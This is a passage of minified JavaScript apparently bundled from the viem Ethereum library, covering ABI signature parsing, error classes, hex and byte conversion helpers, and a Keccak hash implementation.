    const n = h3(e);
    if (!n) throw new li({
        signature: e,
        type: "event"
    });
    const r = Ot(n.parameters),
        s = [],
        i = r.length;
    for (let o = 0; o < i; o++) s.push(Wn(r[o], {
        modifiers: v3,
        structs: t,
        type: "event"
    }));
    return {
        name: n.name,
        type: "event",
        inputs: s
    }
}

function U3(e, t = {}) {
    const n = f3(e);
    if (!n) throw new li({
        signature: e,
        type: "error"
    });
    const r = Ot(n.parameters),
        s = [],
        i = r.length;
    for (let o = 0; o < i; o++) s.push(Wn(r[o], {
        structs: t,
        type: "error"
    }));
    return {
        name: n.name,
        type: "error",
        inputs: s
    }
}

function V3(e, t = {}) {
    const n = x3(e);
    if (!n) throw new li({
        signature: e,
        type: "constructor"
    });
    const r = Ot(n.parameters),
        s = [],
        i = r.length;
    for (let o = 0; o < i; o++) s.push(Wn(r[o], {
        structs: t,
        type: "constructor"
    }));
    return {
        type: "constructor",
        stateMutability: n.stateMutability ?? "nonpayable",
        inputs: s
    }
}

function H3(e) {
    const t = w3(e);
    if (!t) throw new li({
        signature: e,
        type: "fallback"
    });
    return {
        type: "fallback",
        stateMutability: t.stateMutability ?? "nonpayable"
    }
}
const j3 = /^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*(?:\spayable)?)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,
    z3 = /^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,
    q3 = /^u?int$/;

function Wn(e, t) {
    const n = $3(e, t?.type, t?.structs);
    if (ql.has(n)) return ql.get(n);
    const r = cb.test(e),
        s = tr(r ? z3 : j3, e);
    if (!s) throw new A3({
        param: e
    });
    if (s.name && W3(s.name)) throw new N3({
        param: e,
        name: s.name
    });
    const i = s.name ? {
            name: s.name
        } : {},
        o = s.modifier === "indexed" ? {
            indexed: !0
        } : {},
        a = t?.structs ?? {};
    let c, u = {};
    if (r) {
        c = "tuple";
        const f = Ot(s.type),
            d = [],
            h = f.length;
        for (let b = 0; b < h; b++) d.push(Wn(f[b], {
            structs: a
        }));
        u = {
            components: d
        }
    } else if (s.type in a) c = "tuple", u = {
        components: a[s.type]
    };
    else if (q3.test(s.type)) c = `${s.type}256`;
    else if (s.type === "address payable") c = "address";
    else if (c = s.type, t?.type !== "struct" && !mb(c)) throw new C3({
        type: c
    });
    if (s.modifier) {
        if (!t?.modifiers?.has?.(s.modifier)) throw new P3({
            param: e,
            type: t?.type,
            modifier: s.modifier
        });
        if (Vu.has(s.modifier) && !X3(c, !!s.array)) throw new O3({
            param: e,
            type: t?.type,
            modifier: s.modifier
        })
    }
    const l = {
        type: `${c}${s.array??""}`,
        ...i,
        ...o,
        ...u
    };
    return ql.set(n, l), l
}

function Ot(e, t = [], n = "", r = 0) {
    const s = e.trim().length;
    for (let i = 0; i < s; i++) {
        const o = e[i],
            a = e.slice(i + 1);
        switch (o) {
            case ",":
                return r === 0 ? Ot(a, [...t, n.trim()]) : Ot(a, t, `${n}${o}`, r);
            case "(":
                return Ot(a, t, `${n}${o}`, r + 1);
            case ")":
                return Ot(a, t, `${n}${o}`, r - 1);
            default:
                return Ot(a, t, `${n}${o}`, r)
        }
    }
    if (n === "") return t;
    if (r !== 0) throw new L3({
        current: n,
        depth: r
    });
    return t.push(n.trim()), t
}

function mb(e) {
    return e === "address" || e === "bool" || e === "function" || e === "string" || ob.test(e) || ab.test(e)
}
const G3 = /^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;

function W3(e) {
    return e === "address" || e === "bool" || e === "function" || e === "string" || e === "tuple" || ob.test(e) || ab.test(e) || G3.test(e)
}

function X3(e, t) {
    return t || e === "bytes" || e === "string" || e === "tuple"
}

function Mf(e) {
    const t = {},
        n = e.length;
    for (let o = 0; o < n; o++) {
        const a = e[o];
        if (!al(a)) continue;
        const c = b3(a);
        if (!c) throw new li({
            signature: a,
            type: "struct"
        });
        const u = c.properties.split(";"),
            l = [],
            f = u.length;
        for (let d = 0; d < f; d++) {
            const b = u[d].trim();
            if (!b) continue;
            const m = Wn(b, {
                type: "struct"
            });
            l.push(m)
        }
        if (!l.length) throw new k3({
            signature: a
        });
        t[c.name] = l
    }
    const r = {},
        s = Object.entries(t),
        i = s.length;
    for (let o = 0; o < i; o++) {
        const [a, c] = s[o];
        r[a] = bb(c, t)
    }
    return r
}
const K3 = /^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*)(?<array>(?:\[\d*?\])+?)?$/;

function bb(e, t, n = new Set) {
    const r = [],
        s = e.length;
    for (let i = 0; i < s; i++) {
        const o = e[i];
        if (cb.test(o.type)) r.push(o);
        else {
            const c = tr(K3, o.type);
            if (!c?.type) throw new R3({
                abiParameter: o
            });
            const {
                array: u,
                type: l
            } = c;
            if (l in t) {
                if (n.has(l)) throw new B3({
                    type: l
                });
                r.push({
                    ...o,
                    type: `tuple${u??""}`,
                    components: bb(t[l] ?? [], t, new Set([...n, l]))
                })
            } else if (mb(l)) r.push(o);
            else throw new S3({
                type: l
            })
        }
    }
    return r
}

function gb(e) {
    const t = Mf(e),
        n = [],
        r = e.length;
    for (let s = 0; s < r; s++) {
        const i = e[s];
        al(i) || n.push(Hu(i, t))
    }
    return n
}

function Uh(e) {
    let t;
    if (typeof e == "string") t = Hu(e);
    else {
        const n = Mf(e),
            r = e.length;
        for (let s = 0; s < r; s++) {
            const i = e[s];
            if (!al(i)) {
                t = Hu(i, n);
                break
            }
        }
    }
    if (!t) throw new T3({
        signature: e
    });
    return t
}

function Vh(e) {
    const t = [];
    if (typeof e == "string") {
        const n = Ot(e),
            r = n.length;
        for (let s = 0; s < r; s++) t.push(Wn(n[s], {
            modifiers: Fh
        }))
    } else {
        const n = Mf(e),
            r = e.length;
        for (let s = 0; s < r; s++) {
            const i = e[s];
            if (al(i)) continue;
            const o = Ot(i),
                a = o.length;
            for (let c = 0; c < a; c++) t.push(Wn(o[c], {
                modifiers: Fh,
                structs: n
            }))
        }
    }
    if (t.length === 0) throw new I3({
        params: e
    });
    return t
}

function Y(e, t, n) {
    const r = e[t.name];
    if (typeof r == "function") return r;
    const s = e[n];
    return typeof s == "function" ? s : i => t(e, i)
}

function Jt(e, {
    includeName: t = !1
} = {}) {
    if (e.type !== "function" && e.type !== "event" && e.type !== "error") throw new cE(e.type);
    return `${e.name}(${cl(e.inputs,{includeName:t})})`
}

function cl(e, {
    includeName: t = !1
} = {}) {
    return e ? e.map(n => Z3(n, {
        includeName: t
    })).join(t ? ", " : ",") : ""
}

function Z3(e, {
    includeName: t
}) {
    return e.type.startsWith("tuple") ? `(${cl(e.components,{includeName:t})})${e.type.slice(5)}` : e.type + (t && e.name ? ` ${e.name}` : "")
}

function bn(e, {
    strict: t = !0
} = {}) {
    return !e || typeof e != "string" ? !1 : t ? /^0x[0-9a-fA-F]*$/.test(e) : e.startsWith("0x")
}

function Ie(e) {
    return bn(e, {
        strict: !1
    }) ? Math.ceil((e.length - 2) / 2) : e.length
}
const xb = "2.40.3";
let Gl = {
        getDocsUrl: ({
            docsBaseUrl: e,
            docsPath: t = "",
            docsSlug: n
        }) => t ? `${e??"https://viem.sh"}${t}${n?`#${n}`:""}` : void 0,
        version: `viem@${xb}`
    },
    F = class ju extends Error {
        constructor(t, n = {}) {
            const r = n.cause instanceof ju ? n.cause.details : n.cause?.message ? n.cause.message : n.details,
                s = n.cause instanceof ju && n.cause.docsPath || n.docsPath,
                i = Gl.getDocsUrl?.({
                    ...n,
                    docsPath: s
                }),
                o = [t || "An error occurred.", "", ...n.metaMessages ? [...n.metaMessages, ""] : [], ...i ? [`Docs: ${i}`] : [], ...r ? [`Details: ${r}`] : [], ...Gl.version ? [`Version: ${Gl.version}`] : []].join(`
`);
            super(o, n.cause ? {
                cause: n.cause
            } : void 0), Object.defineProperty(this, "details", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), Object.defineProperty(this, "docsPath", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), Object.defineProperty(this, "metaMessages", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), Object.defineProperty(this, "shortMessage", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), Object.defineProperty(this, "version", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: void 0
            }), Object.defineProperty(this, "name", {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: "BaseError"
            }), this.details = r, this.docsPath = s, this.metaMessages = n.metaMessages, this.name = n.name ?? this.name, this.shortMessage = t, this.version = xb
        }
        walk(t) {
            return yb(this, t)
        }
    };

function yb(e, t) {
    return t?.(e) ? e : e && typeof e == "object" && "cause" in e && e.cause !== void 0 ? yb(e.cause, t) : t ? null : e
}
class Y3 extends F {
    constructor({
        docsPath: t
    }) {
        super(["A constructor was not found on the ABI.", "Make sure you are using the correct ABI and that the constructor exists on it."].join(`
`), {
            docsPath: t,
            name: "AbiConstructorNotFoundError"
        })
    }
}
class Hh extends F {
    constructor({
        docsPath: t
    }) {
        super(["Constructor arguments were provided (`args`), but a constructor parameters (`inputs`) were not found on the ABI.", "Make sure you are using the correct ABI, and that the `inputs` attribute on the constructor exists."].join(`
`), {
            docsPath: t,
            name: "AbiConstructorParamsNotFoundError"
        })
    }
}
class wb extends F {
    constructor({
        data: t,
        params: n,
        size: r
    }) {
        super([`Data size of ${r} bytes is too small for given parameters.`].join(`
`), {
            metaMessages: [`Params: (${cl(n,{includeName:!0})})`, `Data:   ${t} (${r} bytes)`],
            name: "AbiDecodingDataSizeTooSmallError"
        }), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "params", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "size", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.data = t, this.params = n, this.size = r
    }
}
class Xo extends F {
    constructor() {
        super('Cannot decode zero data ("0x") with ABI parameters.', {
            name: "AbiDecodingZeroDataError"
        })
    }
}
class J3 extends F {
    constructor({
        expectedLength: t,
        givenLength: n,
        type: r
    }) {
        super([`ABI encoding array length mismatch for type ${r}.`, `Expected length: ${t}`, `Given length: ${n}`].join(`
`), {
            name: "AbiEncodingArrayLengthMismatchError"
        })
    }
}
class Q3 extends F {
    constructor({
        expectedSize: t,
        value: n
    }) {
        super(`Size of bytes "${n}" (bytes${Ie(n)}) does not match expected size (bytes${t}).`, {
            name: "AbiEncodingBytesSizeMismatchError"
        })
    }
}
class eE extends F {
    constructor({
        expectedLength: t,
        givenLength: n
    }) {
        super(["ABI encoding params/values length mismatch.", `Expected length (params): ${t}`, `Given length (values): ${n}`].join(`
`), {
            name: "AbiEncodingLengthMismatchError"
        })
    }
}
class tE extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Arguments (\`args\`) were provided to "${t}", but "${t}" on the ABI does not contain any parameters (\`inputs\`).`, "Cannot encode error result without knowing what the parameter types are.", "Make sure you are using the correct ABI and that the inputs exist on it."].join(`
`), {
            docsPath: n,
            name: "AbiErrorInputsNotFoundError"
        })
    }
}
class jh extends F {
    constructor(t, {
        docsPath: n
    } = {}) {
        super([`Error ${t?`"${t}" `:""}not found on ABI.`, "Make sure you are using the correct ABI and that the error exists on it."].join(`
`), {
            docsPath: n,
            name: "AbiErrorNotFoundError"
        })
    }
}
class _b extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Encoded error signature "${t}" not found on ABI.`, "Make sure you are using the correct ABI and that the error exists on it.", `You can look up the decoded signature here: https://openchain.xyz/signatures?query=${t}.`].join(`
`), {
            docsPath: n,
            name: "AbiErrorSignatureNotFoundError"
        }), Object.defineProperty(this, "signature", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.signature = t
    }
}
class nE extends F {
    constructor({
        docsPath: t
    }) {
        super("Cannot extract event signature from empty topics.", {
            docsPath: t,
            name: "AbiEventSignatureEmptyTopicsError"
        })
    }
}
class Eb extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Encoded event signature "${t}" not found on ABI.`, "Make sure you are using the correct ABI and that the event exists on it.", `You can look up the signature here: https://openchain.xyz/signatures?query=${t}.`].join(`
`), {
            docsPath: n,
            name: "AbiEventSignatureNotFoundError"
        })
    }
}
class zh extends F {
    constructor(t, {
        docsPath: n
    } = {}) {
        super([`Event ${t?`"${t}" `:""}not found on ABI.`, "Make sure you are using the correct ABI and that the event exists on it."].join(`
`), {
            docsPath: n,
            name: "AbiEventNotFoundError"
        })
    }
}
class Zs extends F {
    constructor(t, {
        docsPath: n
    } = {}) {
        super([`Function ${t?`"${t}" `:""}not found on ABI.`, "Make sure you are using the correct ABI and that the function exists on it."].join(`
`), {
            docsPath: n,
            name: "AbiFunctionNotFoundError"
        })
    }
}
class vb extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Function "${t}" does not contain any \`outputs\` on ABI.`, "Cannot decode function result without knowing what the parameter types are.", "Make sure you are using the correct ABI and that the function exists on it."].join(`
`), {
            docsPath: n,
            name: "AbiFunctionOutputsNotFoundError"
        })
    }
}
class rE extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Encoded function signature "${t}" not found on ABI.`, "Make sure you are using the correct ABI and that the function exists on it.", `You can look up the signature here: https://openchain.xyz/signatures?query=${t}.`].join(`
`), {
            docsPath: n,
            name: "AbiFunctionSignatureNotFoundError"
        })
    }
}
class sE extends F {
    constructor(t, n) {
        super("Found ambiguous types in overloaded ABI items.", {
            metaMessages: [`\`${t.type}\` in \`${Jt(t.abiItem)}\`, and`, `\`${n.type}\` in \`${Jt(n.abiItem)}\``, "", "These types encode differently and cannot be distinguished at runtime.", "Remove one of the ambiguous items in the ABI."],
            name: "AbiItemAmbiguityError"
        })
    }
}
let iE = class extends F {
    constructor({
        expectedSize: t,
        givenSize: n
    }) {
        super(`Expected bytes${t}, got bytes${n}.`, {
            name: "BytesSizeMismatchError"
        })
    }
};
class oo extends F {
    constructor({
        abiItem: t,
        data: n,
        params: r,
        size: s
    }) {
        super([`Data size of ${s} bytes is too small for non-indexed event parameters.`].join(`
`), {
            metaMessages: [`Params: (${cl(r,{includeName:!0})})`, `Data:   ${n} (${s} bytes)`],
            name: "DecodeLogDataMismatch"
        }), Object.defineProperty(this, "abiItem", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "data", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "params", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "size", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.abiItem = t, this.data = n, this.params = r, this.size = s
    }
}
class ll extends F {
    constructor({
        abiItem: t,
        param: n
    }) {
        super([`Expected a topic for indexed event parameter${n.name?` "${n.name}"`:""} on event "${Jt(t,{includeName:!0})}".`].join(`
`), {
            name: "DecodeLogTopicsMismatch"
        }), Object.defineProperty(this, "abiItem", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), this.abiItem = t
    }
}
class oE extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Type "${t}" is not a valid encoding type.`, "Please provide a valid ABI type."].join(`
`), {
            docsPath: n,
            name: "InvalidAbiEncodingType"
        })
    }
}
class aE extends F {
    constructor(t, {
        docsPath: n
    }) {
        super([`Type "${t}" is not a valid decoding type.`, "Please provide a valid ABI type."].join(`
`), {
            docsPath: n,
            name: "InvalidAbiDecodingType"
        })
    }
}
let Tb = class extends F {
    constructor(t) {
        super([`Value "${t}" is not a valid array.`].join(`
`), {
            name: "InvalidArrayError"
        })
    }
};
class cE extends F {
    constructor(t) {
        super([`"${t}" is not a valid definition type.`, 'Valid types: "function", "event", "error"'].join(`
`), {
            name: "InvalidDefinitionTypeError"
        })
    }
}
class lE extends F {
    constructor(t) {
        super(`Filter type "${t}" is not supported.`, {
            name: "FilterTypeNotSupportedError"
        })
    }
}
let Sb = class extends F {
        constructor({
            offset: t,
            position: n,
            size: r
        }) {
            super(`Slice ${n==="start"?"starting":"ending"} at offset "${t}" is out-of-bounds (size: ${r}).`, {
                name: "SliceOffsetOutOfBoundsError"
            })
        }
    },
    Cb = class extends F {
        constructor({
            size: t,
            targetSize: n,
            type: r
        }) {
            super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (${t}) exceeds padding size (${n}).`, {
                name: "SizeExceedsPaddingSizeError"
            })
        }
    };
class qh extends F {
    constructor({
        size: t,
        targetSize: n,
        type: r
    }) {
        super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} is expected to be ${n} ${r} long, but is ${t} ${r} long.`, {
            name: "InvalidBytesLengthError"
        })
    }
}

function ui(e, {
    dir: t,
    size: n = 32
} = {}) {
    return typeof e == "string" ? gr(e, {
        dir: t,
        size: n
    }) : uE(e, {
        dir: t,
        size: n
    })
}

function gr(e, {
    dir: t,
    size: n = 32
} = {}) {
    if (n === null) return e;
    const r = e.replace("0x", "");
    if (r.length > n * 2) throw new Cb({
        size: Math.ceil(r.length / 2),
        targetSize: n,
        type: "hex"
    });
    return `0x${r[t==="right"?"padEnd":"padStart"](n*2,"0")}`
}

function uE(e, {
    dir: t,
    size: n = 32
} = {}) {
    if (n === null) return e;
    if (e.length > n) throw new Cb({
        size: e.length,
        targetSize: n,
        type: "bytes"
    });
    const r = new Uint8Array(n);
    for (let s = 0; s < n; s++) {
        const i = t === "right";
        r[i ? s : n - s - 1] = e[i ? s : e.length - s - 1]
    }
    return r
}
let Ib = class extends F {
        constructor({
            max: t,
            min: n,
            signed: r,
            size: s,
            value: i
        }) {
            super(`Number "${i}" is not in safe ${s?`${s*8}-bit ${r?"signed":"unsigned"} `:""}integer range ${t?`(${n} to ${t})`:`(above ${n})`}`, {
                name: "IntegerOutOfRangeError"
            })
        }
    },
    fE = class extends F {
        constructor(t) {
            super(`Bytes value "${t}" is not a valid boolean. The bytes array must contain a single byte of either a 0 or 1 value.`, {
                name: "InvalidBytesBooleanError"
            })
        }
    };
class dE extends F {
    constructor(t) {
        super(`Hex value "${t}" is not a valid boolean. The hex value must be "0x0" (false) or "0x1" (true).`, {
            name: "InvalidHexBooleanError"
        })
    }
}
let hE = class extends F {
    constructor({
        givenSize: t,
        maxSize: n
    }) {
        super(`Size cannot exceed ${n} bytes. Given size: ${t} bytes.`, {
            name: "SizeOverflowError"
        })
    }
};

function xr(e, {
    dir: t = "left"
} = {}) {
    let n = typeof e == "string" ? e.replace("0x", "") : e,
        r = 0;
    for (let s = 0; s < n.length - 1 && n[t === "left" ? s : n.length - s - 1].toString() === "0"; s++) r++;
    return n = t === "left" ? n.slice(r) : n.slice(0, n.length - r), typeof e == "string" ? (n.length === 1 && t === "right" && (n = `${n}0`), `0x${n.length%2===1?`0${n}`:n}`) : n
}

function rn(e, {
    size: t
}) {
    if (Ie(e) > t) throw new hE({
        givenSize: Ie(e),
        maxSize: t
    })
}

function Mt(e, t = {}) {
    const {
        signed: n
    } = t;
    t.size && rn(e, {
        size: t.size
    });
    const r = BigInt(e);
    if (!n) return r;
    const s = (e.length - 2) / 2,
        i = (1n << BigInt(s) * 8n - 1n) - 1n;
    return r <= i ? r : r - BigInt(`0x${"f".padStart(s*2,"f")}`) - 1n
}

function pE(e, t = {}) {
    let n = e;
    if (t.size && (rn(n, {
            size: t.size
        }), n = xr(n)), xr(n) === "0x00") return !1;
    if (xr(n) === "0x01") return !0;
    throw new dE(n)
}

function Qt(e, t = {}) {
    return Number(Mt(e, t))
}
const mE = Array.from({
    length: 256
}, (e, t) => t.toString(16).padStart(2, "0"));

function Xn(e, t = {}) {
    return typeof e == "number" || typeof e == "bigint" ? J(e, t) : typeof e == "string" ? Ys(e, t) : typeof e == "boolean" ? Ab(e, t) : Le(e, t)
}

function Ab(e, t = {}) {
    const n = `0x${Number(e)}`;
    return typeof t.size == "number" ? (rn(n, {
        size: t.size
    }), ui(n, {
        size: t.size
    })) : n
}

function Le(e, t = {}) {
    let n = "";
    for (let s = 0; s < e.length; s++) n += mE[e[s]];
    const r = `0x${n}`;
    return typeof t.size == "number" ? (rn(r, {
        size: t.size
    }), ui(r, {
        dir: "right",
        size: t.size
    })) : r
}

function J(e, t = {}) {
    const {
        signed: n,
        size: r
    } = t, s = BigInt(e);
    let i;
    r ? n ? i = (1n << BigInt(r) * 8n - 1n) - 1n : i = 2n ** (BigInt(r) * 8n) - 1n : typeof e == "number" && (i = BigInt(Number.MAX_SAFE_INTEGER));
    const o = typeof i == "bigint" && n ? -i - 1n : 0;
    if (i && s > i || s < o) {
        const c = typeof e == "bigint" ? "n" : "";
        throw new Ib({
            max: i ? `${i}${c}` : void 0,
            min: `${o}${c}`,
            signed: n,
            size: r,
            value: `${e}${c}`
        })
    }
    const a = `0x${(n&&s<0?(1n<<BigInt(r*8))+BigInt(s):s).toString(16)}`;
    return r ? ui(a, {
        size: r
    }) : a
}
const bE = new TextEncoder;

function Ys(e, t = {}) {
    const n = bE.encode(e);
    return Le(n, t)
}
const gE = new TextEncoder;

function fi(e, t = {}) {
    return typeof e == "number" || typeof e == "bigint" ? yE(e, t) : typeof e == "boolean" ? xE(e, t) : bn(e) ? gn(e, t) : Kr(e, t)
}

function xE(e, t = {}) {
    const n = new Uint8Array(1);
    return n[0] = Number(e), typeof t.size == "number" ? (rn(n, {
        size: t.size
    }), ui(n, {
        size: t.size
    })) : n
}
const vn = {
    zero: 48,
    nine: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};

function Gh(e) {
    if (e >= vn.zero && e <= vn.nine) return e - vn.zero;
    if (e >= vn.A && e <= vn.F) return e - (vn.A - 10);
    if (e >= vn.a && e <= vn.f) return e - (vn.a - 10)
}

function gn(e, t = {}) {
    let n = e;
    t.size && (rn(n, {
        size: t.size
    }), n = ui(n, {
        dir: "right",
        size: t.size
    }));
    let r = n.slice(2);
    r.length % 2 && (r = `0${r}`);
    const s = r.length / 2,
        i = new Uint8Array(s);
    for (let o = 0, a = 0; o < s; o++) {
        const c = Gh(r.charCodeAt(a++)),
            u = Gh(r.charCodeAt(a++));
        if (c === void 0 || u === void 0) throw new F(`Invalid byte sequence ("${r[a-2]}${r[a-1]}" in "${r}").`);
        i[o] = c * 16 + u
    }
    return i
}

function yE(e, t) {
    const n = J(e, t);
    return gn(n)
}

function Kr(e, t = {}) {
    const n = gE.encode(e);
    return typeof t.size == "number" ? (rn(n, {
        size: t.size
    }), ui(n, {
        dir: "right",
        size: t.size
    })) : n
}
const _a = BigInt(2 ** 32 - 1),
    Wh = BigInt(32);

function wE(e, t = !1) {
    return t ? {
        h: Number(e & _a),
        l: Number(e >> Wh & _a)
    } : {
        h: Number(e >> Wh & _a) | 0,
        l: Number(e & _a) | 0
    }
}

function _E(e, t = !1) {
    const n = e.length;
    let r = new Uint32Array(n),
        s = new Uint32Array(n);
    for (let i = 0; i < n; i++) {
        const {
            h: o,
            l: a
        } = wE(e[i], t);
        [r[i], s[i]] = [o, a]
    }
    return [r, s]
}
const EE = (e, t, n) => e << n | t >>> 32 - n,
    vE = (e, t, n) => t << n | e >>> 32 - n,
    TE = (e, t, n) => t << n - 32 | e >>> 64 - n,
    SE = (e, t, n) => e << n - 32 | t >>> 64 - n,
    ws = typeof globalThis == "object" && "crypto" in globalThis ? globalThis.crypto : void 0;

function CE(e) {
    return e instanceof Uint8Array || ArrayBuffer.isView(e) && e.constructor.name === "Uint8Array"
}

function ao(e) {
    if (!Number.isSafeInteger(e) || e < 0) throw new Error("positive integer expected, got " + e)
}

function ss(e, ...t) {
    if (!CE(e)) throw new Error("Uint8Array expected");
    if (t.length > 0 && !t.includes(e.length)) throw new Error("Uint8Array expected of length " + t + ", got length=" + e.length)
}

function IE(e) {
    if (typeof e != "function" || typeof e.create != "function") throw new Error("Hash should be wrapped by utils.createHasher");
    ao(e.outputLen), ao(e.blockLen)
}

function Js(e, t = !0) {
    if (e.destroyed) throw new Error("Hash instance has been destroyed");
    if (t && e.finished) throw new Error("Hash#digest() has already been called")
}

function Nb(e, t) {
    ss(e);
    const n = t.outputLen;
    if (e.length < n) throw new Error("digestInto() expects output buffer of length at least " + n)
}

function AE(e) {
    return new Uint32Array(e.buffer, e.byteOffset, Math.floor(e.byteLength / 4))
}

function Qs(...e) {
    for (let t = 0; t < e.length; t++) e[t].fill(0)
}

function Wl(e) {
    return new DataView(e.buffer, e.byteOffset, e.byteLength)
}

function an(e, t) {
    return e << 32 - t | e >>> t
}
const NE = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;

function PE(e) {
    return e << 24 & 4278190080 | e << 8 & 16711680 | e >>> 8 & 65280 | e >>> 24 & 255
}

function OE(e) {
    for (let t = 0; t < e.length; t++) e[t] = PE(e[t]);
    return e
}
const Xh = NE ? e => e : OE;

function RE(e) {
    if (typeof e != "string") throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(e))
}

function ul(e) {
    return typeof e == "string" && (e = RE(e)), ss(e), e
}

function ME(...e) {
    let t = 0;
    for (let r = 0; r < e.length; r++) {
        const s = e[r];
        ss(s), t += s.length
    }
    const n = new Uint8Array(t);
    for (let r = 0, s = 0; r < e.length; r++) {
        const i = e[r];
        n.set(i, s), s += i.length
    }
    return n
}
class kf {}

function Pb(e) {
    const t = r => e().update(ul(r)).digest(),
        n = e();
    return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = () => e(), t
}

function kE(e = 32) {
    if (ws && typeof ws.getRandomValues == "function") return ws.getRandomValues(new Uint8Array(e));
    if (ws && typeof ws.randomBytes == "function") return Uint8Array.from(ws.randomBytes(e));
    throw new Error("crypto.getRandomValues must be defined")
}
const BE = BigInt(0),
    Ei = BigInt(1),
    LE = BigInt(2),
    $E = BigInt(7),
    DE = BigInt(256),
    FE = BigInt(113),
    Ob = [],
    Rb = [],
    Mb = [];
for (let e = 0, t = Ei, n = 1, r = 0; e < 24; e++) {
    [n, r] = [r, (2 * n + 3 * r) % 5], Ob.push(2 * (5 * r + n)), Rb.push((e + 1) * (e + 2) / 2 % 64);
    let s = BE;
    for (let i = 0; i < 7; i++) t = (t << Ei ^ (t >> $E) * FE) % DE, t & LE && (s ^= Ei << (Ei << BigInt(i)) - Ei);
    Mb.push(s)
}
const kb = _E(Mb, !0),
    UE = kb[0],
    VE = kb[1],
    Kh = (e, t, n) => n > 32 ? TE(e, t, n) : EE(e, t, n),
    Zh = (e, t, n) => n > 32 ? SE(e, t, n) : vE(e, t, n);

function HE(e, t = 24) {
    const n = new Uint32Array(10);
    for (let r = 24 - t; r < 24; r++) {
        for (let o = 0; o < 10; o++) n[o] = e[o] ^ e[o + 10] ^ e[o + 20] ^ e[o + 30] ^ e[o + 40];
        for (let o = 0; o < 10; o += 2) {
            const a = (o + 8) % 10,
                c = (o + 2) % 10,
                u = n[c],
                l = n[c + 1],
                f = Kh(u, l, 1) ^ n[a],
                d = Zh(u, l, 1) ^ n[a + 1];
            for (let h = 0; h < 50; h += 10) e[o + h] ^= f, e[o + h + 1] ^= d
        }
        let s = e[2],
            i = e[3];
        for (let o = 0; o < 24; o++) {
            const a = Rb[o],
                c = Kh(s, i, a),
                u = Zh(s, i, a),
                l = Ob[o];
            s = e[l], i = e[l + 1], e[l] = c, e[l + 1] = u
        }
        for (let o = 0; o < 50; o += 10) {
            for (let a = 0; a < 10; a++) n[a] = e[o + a];
            for (let a = 0; a < 10; a++) e[o + a] ^= ~n[(a + 2) % 10] & n[(a + 4) % 10]
        }
        e[0] ^= UE[r], e[1] ^= VE[r]
    }
    Qs(n)
}
class Bf extends kf {
    constructor(t, n, r, s = !1, i = 24) {
        if (super(), this.pos = 0, this.posOut = 0, this.finished = !1, this.destroyed = !1, this.enableXOF = !1, this.blockLen = t, this.suffix = n, this.outputLen = r, this.enableXOF = s, this.rounds = i, ao(r), !(0 < t && t < 200)) throw new Error("only keccak-f1600 function is supported");
        this.state = new Uint8Array(200), this.state32 = AE(this.state)
    }
    clone() {
        return this._cloneInto()
    }
    keccak() {
        Xh(this.state32), HE(this.state32, this.rounds), Xh(this.state32), this.posOut = 0, this.pos = 0
    }
    update(t) {
        Js(this), t = ul(t), ss(t);
        const {
            blockLen: n,
            state: r
        } = this, s = t.length;
        for (let i = 0; i < s;) {
            const o = Math.min(n - this.pos, s - i);
            for (let a = 0; a < o; a++) r[this.pos++] ^= t[i++];
            this.pos === n && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished) return;
        this.finished = !0;
        const {
            state: t,
            suffix: n,
            pos: r,
            blockLen: s
        } = this;
        t[r] ^= n, (n & 128) !== 0 && r === s - 1 && this.keccak(), t[s - 1] ^= 128, this.keccak()
    }
    writeInto(t) {
        Js(this, !1), ss(t), this.finish();
        const n = this.state,
            {
                blockLen: r
            } = this;
        for (let s = 0, i = t.length; s < i;) {
            this.posOut >= r && this.keccak();
            const o = Math.min(r - this.posOut, i - s);
            t.set(n.subarray(this.posOut, this.posOut + o), s), this.posOut += o, s += o
        }
        return t
    }
    xofInto(t) {
        if (!this.enableXOF) throw new Error("XOF is not possible for this instance");
        return this.writeInto(t)
    }
